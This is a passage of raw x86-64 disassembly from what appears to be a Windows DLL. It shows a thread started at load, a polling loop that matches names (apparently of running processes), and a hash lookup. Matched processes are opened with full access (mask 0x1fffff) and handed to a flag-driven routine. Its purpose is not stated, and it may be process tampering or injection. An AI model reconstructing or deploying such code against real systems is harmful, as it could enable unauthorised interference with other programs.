   180001708:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   18000170f:	00 
   180001710:	48 8d 45 1c          	lea    0x1c(%rbp),%rax
   180001714:	4c 8b c7             	mov    %rdi,%r8
   180001717:	4c 2b c0             	sub    %rax,%r8
   18000171a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   180001720:	0f b6 10             	movzbl (%rax),%edx
   180001723:	42 0f b6 0c 00       	movzbl (%rax,%r8,1),%ecx
   180001728:	2b d1                	sub    %ecx,%edx
   18000172a:	75 07                	jne    0x180001733
   18000172c:	48 ff c0             	inc    %rax
   18000172f:	85 c9                	test   %ecx,%ecx
   180001731:	75 ed                	jne    0x180001720
   180001733:	48 8b cb             	mov    %rbx,%rcx
   180001736:	85 d2                	test   %edx,%edx
   180001738:	74 3a                	je     0x180001774
   18000173a:	48 8d 55 f0          	lea    -0x10(%rbp),%rdx
   18000173e:	ff 15 dc 38 00 00    	call   *0x38dc(%rip)        # 0x180005020
   180001744:	83 f8 01             	cmp    $0x1,%eax
   180001747:	74 c7                	je     0x180001710
   180001749:	48 8b cb             	mov    %rbx,%rcx
   18000174c:	ff 15 d6 38 00 00    	call   *0x38d6(%rip)        # 0x180005028
   180001752:	44 89 74 24 50       	mov    %r14d,0x50(%rsp)
   180001757:	48 83 c6 20          	add    $0x20,%rsi
   18000175b:	49 3b f7             	cmp    %r15,%rsi
   18000175e:	0f 85 5c ff ff ff    	jne    0x1800016c0
   180001764:	b9 0a 00 00 00       	mov    $0xa,%ecx
   180001769:	ff 15 a9 38 00 00    	call   *0x38a9(%rip)        # 0x180005018
   18000176f:	e9 2c ff ff ff       	jmp    0x1800016a0
   180001774:	ff 15 ae 38 00 00    	call   *0x38ae(%rip)        # 0x180005028
   18000177a:	44 8b 45 f8          	mov    -0x8(%rbp),%r8d
   18000177e:	44 89 44 24 50       	mov    %r8d,0x50(%rsp)
   180001783:	45 85 c0             	test   %r8d,%r8d
   180001786:	74 cf                	je     0x180001757
   180001788:	41 8b c0             	mov    %r8d,%eax
   18000178b:	c1 e8 08             	shr    $0x8,%eax
   18000178e:	0f b6 d0             	movzbl %al,%edx
   180001791:	41 0f b6 c0          	movzbl %r8b,%eax
   180001795:	49 33 c5             	xor    %r13,%rax
   180001798:	49 0f af c4          	imul   %r12,%rax
   18000179c:	48 33 d0             	xor    %rax,%rdx
   18000179f:	49 0f af d4          	imul   %r12,%rdx
   1800017a3:	41 8b c0             	mov    %r8d,%eax
   1800017a6:	c1 e8 10             	shr    $0x10,%eax
   1800017a9:	0f b6 c8             	movzbl %al,%ecx
   1800017ac:	48 33 d1             	xor    %rcx,%rdx
   1800017af:	49 0f af d4          	imul   %r12,%rdx
   1800017b3:	41 8b c0             	mov    %r8d,%eax
   1800017b6:	48 c1 e8 18          	shr    $0x18,%rax
   1800017ba:	48 33 d0             	xor    %rax,%rdx
   1800017bd:	49 0f af d4          	imul   %r12,%rdx
   1800017c1:	48 23 55 e0          	and    -0x20(%rbp),%rdx
   1800017c5:	48 03 d2             	add    %rdx,%rdx
   1800017c8:	48 8b 4d c8          	mov    -0x38(%rbp),%rcx
   1800017cc:	48 8b 44 d1 08       	mov    0x8(%rcx,%rdx,8),%rax
   1800017d1:	4c 8b 4d b8          	mov    -0x48(%rbp),%r9
   1800017d5:	49 3b c1             	cmp    %r9,%rax
   1800017d8:	74 1b                	je     0x1800017f5
   1800017da:	48 8b 0c d1          	mov    (%rcx,%rdx,8),%rcx
   1800017de:	44 3b 40 10          	cmp    0x10(%rax),%r8d
   1800017e2:	74 14                	je     0x1800017f8
   1800017e4:	48 3b c1             	cmp    %rcx,%rax
   1800017e7:	74 0c                	je     0x1800017f5
   1800017e9:	48 8b 40 08          	mov    0x8(%rax),%rax
   1800017ed:	44 3b 40 10          	cmp    0x10(%rax),%r8d
   1800017f1:	75 f1                	jne    0x1800017e4
   1800017f3:	eb 03                	jmp    0x1800017f8
   1800017f5:	49 8b c6             	mov    %r14,%rax
   1800017f8:	48 85 c0             	test   %rax,%rax
   1800017fb:	74 09                	je     0x180001806
   1800017fd:	49 3b c1             	cmp    %r9,%rax
   180001800:	0f 85 51 ff ff ff    	jne    0x180001757
   180001806:	33 d2                	xor    %edx,%edx
   180001808:	b9 ff ff 1f 00       	mov    $0x1fffff,%ecx
   18000180d:	ff 15 f5 37 00 00    	call   *0x37f5(%rip)        # 0x180005008
   180001813:	48 8b d8             	mov    %rax,%rbx
   180001816:	48 85 c0             	test   %rax,%rax
   180001819:	0f 84 38 ff ff ff    	je     0x180001757
   18000181f:	4c 8b 44 24 60       	mov    0x60(%rsp),%r8
   180001824:	48 8b 54 24 58       	mov    0x58(%rsp),%rdx
   180001829:	4c 2b c2             	sub    %rdx,%r8
   18000182c:	4c 89 74 24 40       	mov    %r14,0x40(%rsp)
   180001831:	c7 44 24 38 01 00 00 	movl   $0x1,0x38(%rsp)
   180001838:	00 
   180001839:	c6 44 24 30 01       	movb   $0x1,0x30(%rsp)
   18000183e:	c6 44 24 28 01       	movb   $0x1,0x28(%rsp)
   180001843:	c6 44 24 20 01       	movb   $0x1,0x20(%rsp)
   180001848:	41 b1 01             	mov    $0x1,%r9b
   18000184b:	48 8b c8             	mov    %rax,%rcx
   18000184e:	e8 4d 0e 00 00       	call   0x1800026a0
   180001853:	84 c0                	test   %al,%al
   180001855:	74 12                	je     0x180001869
   180001857:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   18000185c:	48 8d 55 98          	lea    -0x68(%rbp),%rdx
   180001860:	48 8d 4d b0          	lea    -0x50(%rbp),%rcx
   180001864:	e8 27 05 00 00       	call   0x180001d90
   180001869:	48 8b cb             	mov    %rbx,%rcx
   18000186c:	ff 15 b6 37 00 00    	call   *0x37b6(%rip)        # 0x180005028
   180001872:	e9 e0 fe ff ff       	jmp    0x180001757
   180001877:	cc                   	int3
   180001878:	cc                   	int3
   180001879:	cc                   	int3
   18000187a:	cc                   	int3
   18000187b:	cc                   	int3
   18000187c:	cc                   	int3
   18000187d:	cc                   	int3
   18000187e:	cc                   	int3
   18000187f:	cc                   	int3
   180001880:	e9 0b 00 00 00       	jmp    0x180001890
   180001885:	cc                   	int3
   180001886:	cc                   	int3
   180001887:	cc                   	int3
   180001888:	cc                   	int3
   180001889:	cc                   	int3
   18000188a:	cc                   	int3
   18000188b:	cc                   	int3
   18000188c:	cc                   	int3
   18000188d:	cc                   	int3
   18000188e:	cc                   	int3
   18000188f:	cc                   	int3
   180001890:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   180001895:	57                   	push   %rdi
   180001896:	48 83 ec 30          	sub    $0x30,%rsp
   18000189a:	48 8b f9             	mov    %rcx,%rdi
   18000189d:	33 db                	xor    %ebx,%ebx
   18000189f:	48 8b 49 18          	mov    0x18(%rcx),%rcx
   1800018a3:	48 85 c9             	test   %rcx,%rcx
   1800018a6:	74 3d                	je     0x1800018e5
   1800018a8:	48 8b 57 28          	mov    0x28(%rdi),%rdx
   1800018ac:	48 2b d1             	sub    %rcx,%rdx
   1800018af:	48 83 e2 f8          	and    $0xfffffffffffffff8,%rdx
   1800018b3:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   1800018ba:	72 18                	jb     0x1800018d4
   1800018bc:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   1800018c0:	48 83 c2 27          	add    $0x27,%rdx
   1800018c4:	48 2b c8             	sub    %rax,%rcx
   1800018c7:	48 83 e9 08          	sub    $0x8,%rcx
   1800018cb:	48 83 f9 1f          	cmp    $0x1f,%rcx
   1800018cf:	77 5c                	ja     0x18000192d
   1800018d1:	48 8b c8             	mov    %rax,%rcx
   1800018d4:	e8 7b 1f 00 00       	call   0x180003854
   1800018d9:	48 89 5f 18          	mov    %rbx,0x18(%rdi)
   1800018dd:	48 89 5f 20          	mov    %rbx,0x20(%rdi)
   1800018e1:	48 89 5f 28          	mov    %rbx,0x28(%rdi)
   1800018e5:	48 8b 4f 08          	mov    0x8(%rdi),%rcx
   1800018e9:	48 8b 41 08          	mov    0x8(%rcx),%rax
   1800018ed:	48 89 18             	mov    %rbx,(%rax)
   1800018f0:	48 8b 09             	mov    (%rcx),%rcx
   1800018f3:	48 85 c9             	test   %rcx,%rcx
   1800018f6:	74 1d                	je     0x180001915
   1800018f8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1800018ff:	00 
   180001900:	48 8b 19             	mov    (%rcx),%rbx
   180001903:	ba 18 00 00 00       	mov    $0x18,%edx
   180001908:	e8 47 1f 00 00       	call   0x180003854
   18000190d:	48 8b cb             	mov    %rbx,%rcx
   180001910:	48 85 db             	test   %rbx,%rbx
   180001913:	75 eb                	jne    0x180001900
   180001915:	48 8b 4f 08          	mov    0x8(%rdi),%rcx
   180001919:	ba 18 00 00 00       	mov    $0x18,%edx
   18000191e:	48 8b 5c 24 48       	mov    0x48(%rsp),%rbx
   180001923:	48 83 c4 30          	add    $0x30,%rsp
   180001927:	5f                   	pop    %rdi
   180001928:	e9 27 1f 00 00       	jmp    0x180003854
   18000192d:	45 33 c9             	xor    %r9d,%r9d
   180001930:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   180001935:	45 33 c0             	xor    %r8d,%r8d
   180001938:	33 d2                	xor    %edx,%edx
   18000193a:	33 c9                	xor    %ecx,%ecx
   18000193c:	ff 15 ce 38 00 00    	call   *0x38ce(%rip)        # 0x180005210
   180001942:	cc                   	int3
   180001943:	cc                   	int3
   180001944:	cc                   	int3
   180001945:	cc                   	int3
   180001946:	cc                   	int3
   180001947:	cc                   	int3
   180001948:	cc                   	int3
   180001949:	cc                   	int3
   18000194a:	cc                   	int3
   18000194b:	cc                   	int3
   18000194c:	cc                   	int3
   18000194d:	cc                   	int3
   18000194e:	cc                   	int3
   18000194f:	cc                   	int3
   180001950:	48 83 ec 38          	sub    $0x38,%rsp
   180001954:	83 fa 01             	cmp    $0x1,%edx
   180001957:	75 1f                	jne    0x180001978
   180001959:	33 c0                	xor    %eax,%eax
   18000195b:	4c 8d 05 1e fb ff ff 	lea    -0x4e2(%rip),%r8        # 0x180001480
   180001962:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   180001967:	45 33 c9             	xor    %r9d,%r9d
   18000196a:	33 d2                	xor    %edx,%edx
   18000196c:	89 44 24 20          	mov    %eax,0x20(%rsp)
   180001970:	33 c9                	xor    %ecx,%ecx
   180001972:	ff 15 b8 36 00 00    	call   *0x36b8(%rip)        # 0x180005030
   180001978:	b8 01 00 00 00       	mov    $0x1,%eax
   18000197d:	48 83 c4 38          	add    $0x38,%rsp
   180001981:	c3                   	ret
   180001982:	cc                   	int3
   180001983:	cc                   	int3
   180001984:	cc                   	int3
   180001985:	cc                   	int3
   180001986:	cc                   	int3
   180001987:	cc                   	int3
   180001988:	cc                   	int3
   180001989:	cc                   	int3
   18000198a:	cc                   	int3
   18000198b:	cc                   	int3
   18000198c:	cc                   	int3
   18000198d:	cc                   	int3
   18000198e:	cc                   	int3
   18000198f:	cc                   	int3
   180001990:	40 53                	rex push %rbx
   180001992:	48 83 ec 30          	sub    $0x30,%rsp
   180001996:	48 8b d9             	mov    %rcx,%rbx
   180001999:	48 8b 09             	mov    (%rcx),%rcx
   18000199c:	48 85 c9             	test   %rcx,%rcx
   18000199f:	74 3e                	je     0x1800019df
   1800019a1:	48 8b 53 10          	mov    0x10(%rbx),%rdx
   1800019a5:	48 2b d1             	sub    %rcx,%rdx
   1800019a8:	48 83 e2 f8          	and    $0xfffffffffffffff8,%rdx
   1800019ac:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   1800019b3:	72 18                	jb     0x1800019cd
   1800019b5:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   1800019b9:	48 83 c2 27          	add    $0x27,%rdx
   1800019bd:	48 2b c8             	sub    %rax,%rcx
   1800019c0:	48 83 e9 08          	sub    $0x8,%rcx
   1800019c4:	48 83 f9 1f          	cmp    $0x1f,%rcx
   1800019c8:	77 1b                	ja     0x1800019e5
   1800019ca:	48 8b c8             	mov    %rax,%rcx
   1800019cd:	e8 82 1e 00 00       	call   0x180003854
   1800019d2:	33 c0                	xor    %eax,%eax
   1800019d4:	48 89 03             	mov    %rax,(%rbx)
   1800019d7:	48 89 43 08          	mov    %rax,0x8(%rbx)
   1800019db:	48 89 43 10          	mov    %rax,0x10(%rbx)
   1800019df:	48 83 c4 30          	add    $0x30,%rsp
   1800019e3:	5b                   	pop    %rbx
   1800019e4:	c3                   	ret
   1800019e5:	33 c0                	xor    %eax,%eax
   1800019e7:	45 33 c9             	xor    %r9d,%r9d
   1800019ea:	45 33 c0             	xor    %r8d,%r8d
   1800019ed:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1800019f2:	33 d2                	xor    %edx,%edx
   1800019f4:	33 c9                	xor    %ecx,%ecx
   1800019f6:	ff 15 14 38 00 00    	call   *0x3814(%rip)        # 0x180005210
   1800019fc:	cc                   	int3
   1800019fd:	cc                   	int3
   1800019fe:	cc                   	int3
   1800019ff:	cc                   	int3
   180001a00:	40 57                	rex push %rdi
   180001a02:	48 83 ec 20          	sub    $0x20,%rsp
   180001a06:	48 8b 11             	mov    (%rcx),%rdx
   180001a09:	48 8b f9             	mov    %rcx,%rdi
   180001a0c:	48 8b 42 08          	mov    0x8(%rdx),%rax
   180001a10:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
   180001a17:	48 8b 0a             	mov    (%rdx),%rcx
   180001a1a:	48 85 c9             	test   %rcx,%rcx
   180001a1d:	74 2b                	je     0x180001a4a
   180001a1f:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   180001a24:	0f 1f 40 00          	nopl   0x0(%rax)
   180001a28:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   180001a2f:	00 
   180001a30:	48 8b 19             	mov    (%rcx),%rbx
   180001a33:	ba 18 00 00 00       	mov    $0x18,%edx
   180001a38:	e8 17 1e 00 00       	call   0x180003854
   180001a3d:	48 8b cb             	mov    %rbx,%rcx
   180001a40:	48 85 db             	test   %rbx,%rbx
   180001a43:	75 eb                	jne    0x180001a30
   180001a45:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   180001a4a:	48 8b 0f             	mov    (%rdi),%rcx
   180001a4d:	ba 18 00 00 00       	mov    $0x18,%edx
   180001a52:	48 83 c4 20          	add    $0x20,%rsp
   180001a56:	5f                   	pop    %rdi
   180001a57:	e9 f8 1d 00 00       	jmp    0x180003854
   180001a5c:	cc                   	int3
   180001a5d:	cc                   	int3
   180001a5e:	cc                   	int3
   180001a5f:	cc                   	int3
   180001a60:	40 53                	rex push %rbx
   180001a62:	48 83 ec 30          	sub    $0x30,%rsp
   180001a66:	48 8b d9             	mov    %rcx,%rbx
   180001a69:	48 8b 09             	mov    (%rcx),%rcx
   180001a6c:	48 85 c9             	test   %rcx,%rcx
   180001a6f:	74 3a                	je     0x180001aab
   180001a71:	48 8b 53 10          	mov    0x10(%rbx),%rdx
   180001a75:	48 2b d1             	sub    %rcx,%rdx
   180001a78:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   180001a7f:	72 18                	jb     0x180001a99
   180001a81:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   180001a85:	48 83 c2 27          	add    $0x27,%rdx
   180001a89:	48 2b c8             	sub    %rax,%rcx
   180001a8c:	48 83 e9 08          	sub    $0x8,%rcx
   180001a90:	48 83 f9 1f          	cmp    $0x1f,%rcx
   180001a94:	77 1b                	ja     0x180001ab1
   180001a96:	48 8b c8             	mov    %rax,%rcx
   180001a99:	e8 b6 1d 00 00       	call   0x180003854
   180001a9e:	33 c0                	xor    %eax,%eax
   180001aa0:	48 89 03             	mov    %rax,(%rbx)
   180001aa3:	48 89 43 08          	mov    %rax,0x8(%rbx)
   180001aa7:	48 89 43 10          	mov    %rax,0x10(%rbx)
   180001aab:	48 83 c4 30          	add    $0x30,%rsp
   180001aaf:	5b                   	pop    %rbx
   180001ab0:	c3                   	ret
   180001ab1:	33 c0                	xor    %eax,%eax
   180001ab3:	45 33 c9             	xor    %r9d,%r9d
   180001ab6:	45 33 c0             	xor    %r8d,%r8d
   180001ab9:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   180001abe:	33 d2                	xor    %edx,%edx
   180001ac0:	33 c9                	xor    %ecx,%ecx
   180001ac2:	ff 15 48 37 00 00    	call   *0x3748(%rip)        # 0x180005210
   180001ac8:	cc                   	int3
   180001ac9:	cc                   	int3
   180001aca:	cc                   	int3
   180001acb:	cc                   	int3
   180001acc:	cc                   	int3
   180001acd:	cc                   	int3
   180001ace:	cc                   	int3
   180001acf:	cc                   	int3
   180001ad0:	40 53                	rex push %rbx
   180001ad2:	48 83 ec 30          	sub    $0x30,%rsp
   180001ad6:	48 8b 51 18          	mov    0x18(%rcx),%rdx
   180001ada:	48 8b d9             	mov    %rcx,%rbx
   180001add:	48 83 fa 0f          	cmp    $0xf,%rdx
   180001ae1:	76 2c                	jbe    0x180001b0f
   180001ae3:	48 8b 09             	mov    (%rcx),%rcx
   180001ae6:	48 ff c2             	inc    %rdx
   180001ae9:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   180001af0:	72 18                	jb     0x180001b0a
   180001af2:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   180001af6:	48 83 c2 27          	add    $0x27,%rdx
   180001afa:	48 2b c8             	sub    %rax,%rcx
   180001afd:	48 83 e9 08          	sub    $0x8,%rcx
   180001b01:	48 83 f9 1f          	cmp    $0x1f,%rcx
   180001b05:	77 21                	ja     0x180001b28
   180001b07:	48 8b c8             	mov    %rax,%rcx
   180001b0a:	e8 45 1d 00 00       	call   0x180003854
   180001b0f:	48 c7 43 10 00 00 00 	movq   $0x0,0x10(%rbx)
   180001b16:	00 
   180001b17:	48 c7 43 18 0f 00 00 	movq   $0xf,0x18(%rbx)
   180001b1e:	00 
   180001b1f:	c6 03 00             	movb   $0x0,(%rbx)
   180001b22:	48 83 c4 30          	add    $0x30,%rsp
   180001b26:	5b                   	pop    %rbx
   180001b27:	c3                   	ret
   180001b28:	45 33 c9             	xor    %r9d,%r9d
   180001b2b:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   180001b32:	00 00 
   180001b34:	45 33 c0             	xor    %r8d,%r8d
   180001b37:	33 d2                	xor    %edx,%edx
   180001b39:	33 c9                	xor    %ecx,%ecx
   180001b3b:	ff 15 cf 36 00 00    	call   *0x36cf(%rip)        # 0x180005210
   180001b41:	cc                   	int3
   180001b42:	cc                   	int3
   180001b43:	cc                   	int3
   180001b44:	cc                   	int3
   180001b45:	cc                   	int3
   180001b46:	cc                   	int3
   180001b47:	cc                   	int3
   180001b48:	cc                   	int3
   180001b49:	cc                   	int3
   180001b4a:	cc                   	int3
   180001b4b:	cc                   	int3
   180001b4c:	cc                   	int3
   180001b4d:	cc                   	int3
   180001b4e:	cc                   	int3
   180001b4f:	cc                   	int3
   180001b50:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   180001b55:	55                   	push   %rbp
   180001b56:	56                   	push   %rsi
   180001b57:	57                   	push   %rdi
   180001b58:	41 54                	push   %r12
   180001b5a:	41 55                	push   %r13
   180001b5c:	41 56                	push   %r14
   180001b5e:	41 57                	push   %r15
   180001b60:	48 83 ec 50          	sub    $0x50,%rsp
   180001b64:	4d 8b f1             	mov    %r9,%r14
   180001b67:	4d 8b e0             	mov    %r8,%r12
   180001b6a:	4c 89 44 24 38       	mov    %r8,0x38(%rsp)
   180001b6f:	48 8b da             	mov    %rdx,%rbx
   180001b72:	4c 8b f9             	mov    %rcx,%r15
   180001b75:	48 8b 39             	mov    (%rcx),%rdi
   180001b78:	48 89 7c 24 30       	mov    %rdi,0x30(%rsp)
   180001b7d:	48 8b 69 08          	mov    0x8(%rcx),%rbp
   180001b81:	4d 85 c9             	test   %r9,%r9
   180001b84:	0f 84 e0 01 00 00    	je     0x180001d6a
   180001b8a:	48 8b 49 10          	mov    0x10(%rcx),%rcx
   180001b8e:	48 8b c1             	mov    %rcx,%rax
   180001b91:	48 2b c5             	sub    %rbp,%rax
   180001b94:	4c 3b c8             	cmp    %rax,%r9
   180001b97:	0f 86 5d 01 00 00    	jbe    0x180001cfa
   180001b9d:	4c 8b e5             	mov    %rbp,%r12
   180001ba0:	4c 2b e7             	sub    %rdi,%r12
   180001ba3:	48 be ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rsi
   180001baa:	ff ff 7f 
   180001bad:	48 8b c6             	mov    %rsi,%rax
   180001bb0:	49 2b c4             	sub    %r12,%rax
   180001bb3:	4c 3b c8             	cmp    %rax,%r9
   180001bb6:	0f 87 c6 01 00 00    	ja     0x180001d82
   180001bbc:	4f 8d 04 21          	lea    (%r9,%r12,1),%r8
   180001bc0:	4c 89 44 24 40       	mov    %r8,0x40(%rsp)
   180001bc5:	48 2b cf             	sub    %rdi,%rcx
   180001bc8:	48 8b d1             	mov    %rcx,%rdx
   180001bcb:	48 d1 ea             	shr    $1,%rdx
   180001bce:	48 8b c6             	mov    %rsi,%rax
   180001bd1:	48 2b c2             	sub    %rdx,%rax
   180001bd4:	48 3b c8             	cmp    %rax,%rcx
   180001bd7:	76 26                	jbe    0x180001bff
   180001bd9:	48 b9 26 00 00 00 00 	movabs $0x8000000000000026,%rcx
   180001be0:	00 00 80 
   180001be3:	e8 f8 17 00 00       	call   0x1800033e0
   180001be8:	48 85 c0             	test   %rax,%rax
   180001beb:	0f 84 ef 00 00 00    	je     0x180001ce0
   180001bf1:	48 8d 78 27          	lea    0x27(%rax),%rdi
   180001bf5:	48 83 e7 e0          	and    $0xffffffffffffffe0,%rdi
   180001bf9:	48 89 47 f8          	mov    %rax,-0x8(%rdi)
   180001bfd:	eb 3a                	jmp    0x180001c39
   180001bff:	48 8d 04 0a          	lea    (%rdx,%rcx,1),%rax
   180001c03:	49 8b f0             	mov    %r8,%rsi
   180001c06:	49 3b c0             	cmp    %r8,%rax
   180001c09:	48 0f 43 f0          	cmovae %rax,%rsi
   180001c0d:	48 85 f6             	test   %rsi,%rsi
   180001c10:	75 04                	jne    0x180001c16
   180001c12:	33 ff                	xor    %edi,%edi
   180001c14:	eb 23                	jmp    0x180001c39
   180001c16:	48 81 fe 00 10 00 00 	cmp    $0x1000,%rsi
   180001c1d:	72 0f                	jb     0x180001c2e
   180001c1f:	48 8d 4e 27          	lea    0x27(%rsi),%rcx
   180001c23:	48 3b ce             	cmp    %rsi,%rcx
   180001c26:	0f 86 5c 01 00 00    	jbe    0x180001d88
   180001c2c:	eb b5                	jmp    0x180001be3
   180001c2e:	48 8b ce             	mov    %rsi,%rcx
   180001c31:	e8 aa 17 00 00       	call   0x1800033e0
   180001c36:	48 8b f8             	mov    %rax,%rdi
   180001c39:	4c 8b eb             	mov    %rbx,%r13
   180001c3c:	4c 2b 6c 24 30       	sub    0x30(%rsp),%r13
   180001c41:	4a 8d 0c 2f          	lea    (%rdi,%r13,1),%rcx
   180001c45:	4d 8b c6             	mov    %r14,%r8
   180001c48:	48 8b 54 24 38       	mov    0x38(%rsp),%rdx
   180001c4d:	e8 c2 28 00 00       	call   0x180004514
   180001c52:	49 83 fe 01          	cmp    $0x1,%r14
   180001c56:	75 12                	jne    0x180001c6a
   180001c58:	48 3b dd             	cmp    %rbp,%rbx
   180001c5b:	75 0d                	jne    0x180001c6a
   180001c5d:	4d 8b c4             	mov    %r12,%r8
   180001c60:	48 8b 54 24 30       	mov    0x30(%rsp),%rdx
   180001c65:	48 8b cf             	mov    %rdi,%rcx
   180001c68:	eb 20                	jmp    0x180001c8a
   180001c6a:	4d 8b c5             	mov    %r13,%r8
   180001c6d:	48 8b 54 24 30       	mov    0x30(%rsp),%rdx
   180001c72:	48 8b cf             	mov    %rdi,%rcx
   180001c75:	e8 9a 28 00 00       	call   0x180004514
   180001c7a:	48 2b eb             	sub    %rbx,%rbp
   180001c7d:	49 8d 0c 3e          	lea    (%r14,%rdi,1),%rcx
   180001c81:	49 03 cd             	add    %r13,%rcx
   180001c84:	4c 8b c5             	mov    %rbp,%r8
   180001c87:	48 8b d3             	mov    %rbx,%rdx
   180001c8a:	e8 85 28 00 00       	call   0x180004514
   180001c8f:	49 8b 0f             	mov    (%r15),%rcx
   180001c92:	48 85 c9             	test   %rcx,%rcx
   180001c95:	74 2d                	je     0x180001cc4
   180001c97:	49 8b 57 10          	mov    0x10(%r15),%rdx
   180001c9b:	48 2b d1             	sub    %rcx,%rdx
   180001c9e:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   180001ca5:	72 18                	jb     0x180001cbf
   180001ca7:	48 83 c2 27          	add    $0x27,%rdx
   180001cab:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   180001caf:	48 2b c8             	sub    %rax,%rcx
   180001cb2:	48 83 e9 08          	sub    $0x8,%rcx
   180001cb6:	48 83 f9 1f          	cmp    $0x1f,%rcx
   180001cba:	77 24                	ja     0x180001ce0
   180001cbc:	48 8b c8             	mov    %rax,%rcx
   180001cbf:	e8 90 1b 00 00       	call   0x180003854
   180001cc4:	49 89 3f             	mov    %rdi,(%r15)
   180001cc7:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   180001ccc:	48 03 c7             	add    %rdi,%rax
   180001ccf:	49 89 47 08          	mov    %rax,0x8(%r15)
   180001cd3:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
   180001cd7:	49 89 47 10          	mov    %rax,0x10(%r15)
   180001cdb:	e9 8a 00 00 00       	jmp    0x180001d6a
   180001ce0:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   180001ce7:	00 00 
   180001ce9:	45 33 c9             	xor    %r9d,%r9d
   180001cec:	45 33 c0             	xor    %r8d,%r8d
   180001cef:	33 d2                	xor    %edx,%edx
   180001cf1:	33 c9                	xor    %ecx,%ecx
   180001cf3:	ff 15 17 35 00 00    	call   *0x3517(%rip)        # 0x180005210
   180001cf9:	cc                   	int3
   180001cfa:	48 8b f5             	mov    %rbp,%rsi
   180001cfd:	48 2b f3             	sub    %rbx,%rsi
   180001d00:	4c 3b f6             	cmp    %rsi,%r14
   180001d03:	73 40                	jae    0x180001d45
   180001d05:	48 8b fd             	mov    %rbp,%rdi
   180001d08:	49 2b fe             	sub    %r14,%rdi
   180001d0b:	4d 8b c6             	mov    %r14,%r8
   180001d0e:	48 8b d7             	mov    %rdi,%rdx
   180001d11:	48 8b cd             	mov    %rbp,%rcx
   180001d14:	e8 fb 27 00 00       	call   0x180004514
   180001d19:	49 8d 04 2e          	lea    (%r14,%rbp,1),%rax
   180001d1d:	49 89 47 08          	mov    %rax,0x8(%r15)
   180001d21:	48 2b fb             	sub    %rbx,%rdi
   180001d24:	48 2b ef             	sub    %rdi,%rbp
   180001d27:	4c 8b c7             	mov    %rdi,%r8
   180001d2a:	48 8b d3             	mov    %rbx,%rdx
   180001d2d:	48 8b cd             	mov    %rbp,%rcx
   180001d30:	e8 df 27 00 00       	call   0x180004514
   180001d35:	4d 8b c6             	mov    %r14,%r8
   180001d38:	49 8b d4             	mov    %r12,%rdx
   180001d3b:	48 8b cb             	mov    %rbx,%rcx
   180001d3e:	e8 d1 27 00 00       	call   0x180004514
   180001d43:	eb 25                	jmp    0x180001d6a
   180001d45:	49 8d 3c 11          	lea    (%r9,%rdx,1),%rdi
   180001d49:	4c 8b c6             	mov    %rsi,%r8
   180001d4c:	48 8b cf             	mov    %rdi,%rcx
   180001d4f:	e8 c0 27 00 00       	call   0x180004514
   180001d54:	48 8d 04 3e          	lea    (%rsi,%rdi,1),%rax
   180001d58:	49 89 47 08          	mov    %rax,0x8(%r15)
   180001d5c:	4d 8b c6             	mov    %r14,%r8
   180001d5f:	49 8b d4             	mov    %r12,%rdx
   180001d62:	48 8b cb             	mov    %rbx,%rcx
   180001d65:	e8 aa 27 00 00       	call   0x180004514
   180001d6a:	48 8b 9c 24 98 00 00 	mov    0x98(%rsp),%rbx
   180001d71:	00 
   180001d72:	48 83 c4 50          	add    $0x50,%rsp
   180001d76:	41 5f                	pop    %r15
   180001d78:	41 5e                	pop    %r14
   180001d7a:	41 5d                	pop    %r13
   180001d7c:	41 5c                	pop    %r12
   180001d7e:	5f                   	pop    %rdi
   180001d7f:	5e                   	pop    %rsi
   180001d80:	5d                   	pop    %rbp
   180001d81:	c3                   	ret
   180001d82:	e8 c9 06 00 00       	call   0x180002450
   180001d87:	cc                   	int3
   180001d88:	e8 e3 f4 ff ff       	call   0x180001270
   180001d8d:	cc                   	int3
   180001d8e:	cc                   	int3
   180001d8f:	cc                   	int3
   180001d90:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   180001d95:	55                   	push   %rbp
   180001d96:	56                   	push   %rsi
   180001d97:	57                   	push   %rdi
   180001d98:	41 56                	push   %r14
   180001d9a:	41 57                	push   %r15
   180001d9c:	48 83 ec 30          	sub    $0x30,%rsp
   180001da0:	49 8b f8             	mov    %r8,%rdi
   180001da3:	4c 8b f2             	mov    %rdx,%r14
   180001da6:	48 8b e9             	mov    %rcx,%rbp
   180001da9:	45 0f b6 38          	movzbl (%r8),%r15d
   180001dad:	48 b8 25 23 22 84 e4 	movabs $0xcbf29ce484222325,%rax
   180001db4:	9c f2 cb 
   180001db7:	4c 33 f8             	xor    %rax,%r15
   180001dba:	48 b9 b3 01 00 00 00 	movabs $0x100000001b3,%rcx
   180001dc1:	01 00 00 
   180001dc4:	4c 0f af f9          	imul   %rcx,%r15
   180001dc8:	41 0f b6 40 01       	movzbl 0x1(%r8),%eax
   180001dcd:	4c 33 f8             	xor    %rax,%r15
   180001dd0:	4c 0f af f9          	imul   %rcx,%r15
